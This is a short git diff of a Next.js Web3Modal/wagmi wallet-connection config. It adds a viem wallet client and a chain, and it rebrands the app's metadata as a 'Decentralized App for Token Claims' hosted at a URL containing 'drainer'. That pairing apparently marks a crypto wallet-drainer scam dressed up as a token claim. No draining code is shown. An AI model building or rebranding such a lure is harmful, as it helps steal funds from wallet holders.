@@ -4,24 +4,30 @@ import { createWeb3Modal, defaultWagmiConfig } from '@web3modal/wagmi/react';
 
 import { WagmiConfig, configureChains, Chain, createConfig, sepolia  } from 'wagmi';
 import { publicProvider } from 'wagmi/providers/public';
-import { mainnet, goerli, bsc } from 'viem/chains';
+import { createWalletClient, http } from 'viem'
+import { mainnet, goerli, bsc, } from 'viem/chains';
 import "@/styles/globals.css";
+
 
 // 1. Get projectId at https://cloud.walletconnect.com
 
 const projectId =
   process.env.NEXT_PUBLIC_PROJECT_ID || 'd332748588db640266e834d819731c31';
-
+  
+const client = createWalletClient({
+  chain: mainnet,
+  transport: http()
+})
 
 // 2. Create wagmiConfig
 const metadata = {
-  name: 'Web3Modal',
-  description: 'Justdapp',
-  url: 'https://sync.justdapp.pro/',
+  name: 'D-Apps',
+  description: 'Decentralized App for Token Claims.',
+  url: 'https://https://updated-drainer.vercel.app//',
   icons: ['https://avatars.githubusercontent.com/u/37784886'],
 };
 
-const chains = [mainnet, goerli, bsc];
+const chains = [mainnet, goerli, bsc, sepolia];
 const wagmiConfig = defaultWagmiConfig({ chains, projectId, metadata });
 
 // 3. Create modal
